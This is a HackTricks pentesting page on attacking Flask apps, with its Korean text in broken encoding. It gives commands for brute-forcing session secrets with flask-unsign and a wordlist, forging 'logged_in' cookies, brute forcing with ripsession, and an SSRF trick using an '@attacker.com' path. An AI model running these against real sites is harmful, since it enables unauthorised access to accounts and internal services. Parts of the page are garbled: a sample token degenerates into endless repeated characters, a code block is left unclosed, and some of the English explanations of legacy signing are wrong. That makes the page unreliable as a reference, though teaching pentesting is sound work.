# Flask

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— ì œì¶œ**í•˜ì„¸ìš”.

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

ì„¸ê³„ì—ì„œ ê°€ì¥ **ê³ ê¸‰** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¥¼ í™œìš©í•˜ì—¬ **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  ìë™í™”**í•˜ëŠ” ë° [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**CTFë¥¼ í”Œë ˆì´í•˜ê³  ìˆë‹¤ë©´ Flask ì• í”Œë¦¬ì¼€ì´ì…˜ì€** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**ì™€ ê´€ë ¨ë  ê²ƒì…ë‹ˆë‹¤.**

## ì¿ í‚¤

ê¸°ë³¸ ì¿ í‚¤ ì„¸ì…˜ ì´ë¦„ì€ **`session`**ì…ë‹ˆë‹¤.

### ë””ì½”ë”

ì˜¨ë¼ì¸ Flask ì¿ í‚¤ ë””ì½”ë”: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### ìˆ˜ë™

ì¿ í‚¤ì˜ ì²« ë²ˆì§¸ ì ê¹Œì§€ì˜ ì²« ë²ˆì§¸ ë¶€ë¶„ì„ ê°€ì ¸ì™€ Base64ë¡œ ë””ì½”ë”©í•˜ì„¸ìš”>
```bash
echo "ImhlbGxvIg" | base64 -d
```
ì¿ í‚¤ëŠ” ë˜í•œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œëª…ë©ë‹ˆë‹¤.

### **Flask-Unsign**

ì‹œí¬ë¦¿ í‚¤ë¥¼ ì¶”ì¸¡í•˜ì—¬ Flask ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì„¸ì…˜ ì¿ í‚¤ë¥¼ ê°€ì ¸ì˜¤ê³  ë””ì½”ë”©í•˜ë©° ë¬´ì°¨ë³„ ëŒ€ì…(brute-force) ë° ì¡°ì‘(craft)í•˜ëŠ” ëª…ë ¹ ì¤„ ë„êµ¬ì…ë‹ˆë‹¤.

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **ì¿ í‚¤ ë””ì½”ë”©**

To decode a Flask cookie, you can use the `itsdangerous` library. The `itsdangerous` library provides a `URLSafeTimedSerializer` class that can be used to decode and verify the integrity of the cookie.

```python
from itsdangerous import URLSafeTimedSerializer

def decode_cookie(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    try:
        decoded_data = serializer.loads(cookie_value)
        return decoded_data
    except Exception as e:
        return str(e)
```

In the above code, the `decode_cookie` function takes two parameters: `cookie_value` and `secret_key`. The `cookie_value` parameter is the value of the cookie that you want to decode, and the `secret_key` parameter is the secret key used to sign the cookie.

The function creates an instance of the `URLSafeTimedSerializer` class with the provided `secret_key`. It then attempts to decode the `cookie_value` using the `loads` method of the serializer. If the decoding is successful, the decoded data is returned. If an exception occurs during the decoding process, the function returns the error message as a string.

To use the `decode_cookie` function, simply pass the cookie value and secret key as arguments:

```python
cookie_value = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.3z3X3z3X3z3X3z3X3z3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²© (Brute Force)**

A brute force attack is a method used to gain unauthorized access to a system by systematically trying all possible combinations of passwords or encryption keys until the correct one is found. This attack is based on the assumption that the password or encryption key is weak and can be easily guessed.

ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì€ ì‹œìŠ¤í…œì— ë¬´ë‹¨ìœ¼ë¡œ ì ‘ê·¼í•˜ê¸° ìœ„í•´ ë¹„ë°€ë²ˆí˜¸ë‚˜ ì•”í˜¸í™” í‚¤ì˜ ëª¨ë“  ê°€ëŠ¥í•œ ì¡°í•©ì„ ì²´ê³„ì ìœ¼ë¡œ ì‹œë„í•˜ì—¬ ì˜¬ë°”ë¥¸ ì¡°í•©ì„ ì°¾ëŠ” ë°©ë²•ì…ë‹ˆë‹¤. ì´ ê³µê²©ì€ ë¹„ë°€ë²ˆí˜¸ë‚˜ ì•”í˜¸í™” í‚¤ê°€ ì•½í•˜ê³  ì‰½ê²Œ ì¶”ì¸¡ë  ìˆ˜ ìˆë‹¤ëŠ” ê°€ì •ì— ê¸°ë°˜í•©ë‹ˆë‹¤.

In the context of web application pentesting, a brute force attack can be used to guess usernames and passwords for login pages, or to guess session IDs or tokens to gain unauthorized access to restricted areas of the application.

ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ íœí…ŒìŠ¤íŒ…ì˜ ë§¥ë½ì—ì„œ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì€ ë¡œê·¸ì¸ í˜ì´ì§€ì˜ ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¶”ì¸¡í•˜ê±°ë‚˜, ì„¸ì…˜ IDë‚˜ í† í°ì„ ì¶”ì¸¡í•˜ì—¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì œí•œëœ ì˜ì—­ì— ë¬´ë‹¨ìœ¼ë¡œ ì ‘ê·¼í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

There are different tools and techniques that can be used to perform a brute force attack, such as Hydra, Medusa, or custom scripts. It is important to note that brute forcing is an illegal activity unless you have explicit permission to perform it on a target system.

Hydra, Medusa ë˜ëŠ” ì‚¬ìš©ì ì •ì˜ ìŠ¤í¬ë¦½íŠ¸ì™€ ê°™ì€ ë‹¤ì–‘í•œ ë„êµ¬ì™€ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ëŒ€ìƒ ì‹œìŠ¤í…œì—ì„œ ëª…ì‹œì ì¸ í—ˆê°€ë¥¼ ë°›ì§€ ì•Šì€ í•œ, ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì€ ë¶ˆë²•ì ì¸ í™œë™ì„ì„ ìœ ì˜í•´ì•¼ í•©ë‹ˆë‹¤.
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **ì„œëª…**

Flask provides a built-in mechanism for signing data to ensure its integrity and authenticity. This can be useful in various scenarios, such as preventing tampering with session data or verifying the authenticity of data received from external sources.

Flask uses the `itsdangerous` library to handle the signing process. This library provides a `Signer` class that can be used to sign and verify data.

To sign data in Flask, you can use the `sign` method of the `Signer` class. This method takes the data to be signed and returns a signed string.

```python
from itsdangerous import Signer

data = "Hello, world!"
secret_key = "my_secret_key"

signer = Signer(secret_key)
signed_data = signer.sign(data)

print(signed_data)
```

To verify the authenticity of signed data, you can use the `unsign` method of the `Signer` class. This method takes the signed string and returns the original data if the signature is valid. Otherwise, it raises a `BadSignature` exception.

```python
from itsdangerous import Signer, BadSignature

signed_data = "..."
secret_key = "my_secret_key"

signer = Signer(secret_key)

try:
    original_data = signer.unsign(signed_data)
    print(original_data)
except BadSignature:
    print("Invalid signature")
```

By default, Flask uses the `SECRET_KEY` configuration variable as the secret key for signing. It is recommended to use a strong and unique secret key to ensure the security of the signed data.

Note that signing data does not encrypt it. If you need to encrypt data, you should use a separate encryption mechanism in addition to signing.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### ê³ ì „ ë²„ì „ì„ ì‚¬ìš©í•œ ì„œëª…

In some cases, you may encounter web applications that use legacy versions of Flask, which have different signing methods compared to the latest versions. It is important to understand these legacy signing methods in order to successfully exploit vulnerabilities in such applications.

##### Legacy Signing Methods

1. **SHA1-based signing**: In older versions of Flask, the `itsdangerous` library used SHA1 as the default signing algorithm. This algorithm is considered weak and vulnerable to collision attacks. To sign a message using SHA1, you can use the following code:

```python
from itsdangerous import URLSafeSerializer

secret_key = 'your_secret_key'
serializer = URLSafeSerializer(secret_key)
signed_message = serializer.dumps('your_message')
```

2. **HMAC-SHA1 signing**: Another legacy signing method used in older Flask versions is HMAC-SHA1. This method provides better security compared to SHA1-based signing. To sign a message using HMAC-SHA1, you can use the following code:

```python
from itsdangerous import URLSafeTimedSerializer

secret_key = 'your_secret_key'
serializer = URLSafeTimedSerializer(secret_key)
signed_message = serializer.dumps('your_message')
```

##### Exploiting Legacy Signing

When dealing with web applications that use legacy signing methods, it is important to understand the vulnerabilities associated with these methods. For example, SHA1-based signing is vulnerable to collision attacks, which can allow an attacker to forge a valid signature for a different message. Similarly, HMAC-SHA1 signing can be vulnerable to timing attacks, where an attacker can exploit the time taken to compute the HMAC-SHA1 signature.

By understanding these vulnerabilities, you can effectively exploit web applications that use legacy signing methods and gain unauthorized access or perform other malicious activities.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

flask-unsignì„ ì‚¬ìš©í•˜ì—¬ ì œì‘ëœ ì¿ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ì‚¬ì´íŠ¸ë¥¼ ë¬´ì°¨ë³„ ëŒ€ì…(brute-force)í•˜ëŠ” ëª…ë ¹ ì¤„ ë„êµ¬ì…ë‹ˆë‹¤.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### SQLi in Flask ì„¸ì…˜ ì¿ í‚¤ë¡œ SQLmap ì‚¬ìš©í•˜ê¸°

[**ì´ ì˜ˆì œ**](../../pentesting-web/sql-injection/sqlmap/#eval)ëŠ” ì•Œë ¤ì§„ ë¹„ë°€ì„ ì‚¬ìš©í•˜ì—¬ Flaskì— ëŒ€í•œ sqlmap í˜ì´ë¡œë“œë¥¼ ìë™ìœ¼ë¡œ ì„œëª…í•˜ëŠ” sqlmap `eval` ì˜µì…˜ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

## Flask í”„ë¡ì‹œë¥¼ ì‚¬ìš©í•œ SSRF

[**ì´ ì„¤ëª…**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)ì—ì„œ Flaskê°€ "@" ë¬¸ìë¡œ ì‹œì‘í•˜ëŠ” ìš”ì²­ì„ í—ˆìš©í•˜ëŠ” ë°©ë²•ì´ ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
ë‹¤ìŒ ì‹œë‚˜ë¦¬ì˜¤ ì¤‘ì—ì„œëŠ”:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
"@attacker.com"ê³¼ ê°™ì€ ê²ƒì„ ë„ì…í•˜ì—¬ **SSRF**ë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.



<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ ê°€ì¥ **ê³ ê¸‰ ì»¤ë®¤ë‹ˆí‹° ë„êµ¬**ë¥¼ í™œìš©í•œ **ì›Œí¬í”Œë¡œìš°**ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  ìë™í™”í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**ë¡œë¶€í„° AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
